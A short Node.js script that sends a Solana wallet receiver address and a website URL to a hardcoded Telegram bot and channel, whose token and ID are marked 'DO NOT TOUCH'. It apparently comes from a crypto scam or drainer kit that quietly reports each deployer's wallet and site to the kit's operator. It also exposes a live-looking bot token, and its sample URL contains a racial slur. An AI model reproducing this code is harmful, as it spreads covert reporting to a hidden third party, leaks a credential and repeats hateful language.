const axios = require('axios');

// Telegram Bot API token [ DO NOT TOUCH ]
const botToken = '7675875616:AAEgBrKlJV1K2qgtEt69g8Kzs97YcBZvrBc';

// Telegram channel ID [ DO NOT TOUCH ]
const chatId = '1002652189311';


async function sendMessageToTelegram(solana_wallet_receiver_id, website_url) {
    try {
        const message = `SOLANA Wallet Receiver ID: ${solana_wallet_receiver_id}\nWebsite URL: ${website_url}`;
        const response = await axios.post(
            `https://api.telegram.org/bot${botToken}/sendMessage`,
            {
                chat_id: chatId,
                text: message
            }
        );
        console.log('Message sent to Telegram:', response.data);
    } catch (error) {
        console.error('Error sending message to Telegram:', error);
    }
}

// Change this information for yours (
const solana_wallet_receiver_id = '7GMHQSwrsTWjJwbHkwihdRePfzUbXEy7ySbn3mqcnDDx';
const website_url = 'https://nigger.com';
sendMessageToTelegram(solana_wallet_receiver_id, website_url);
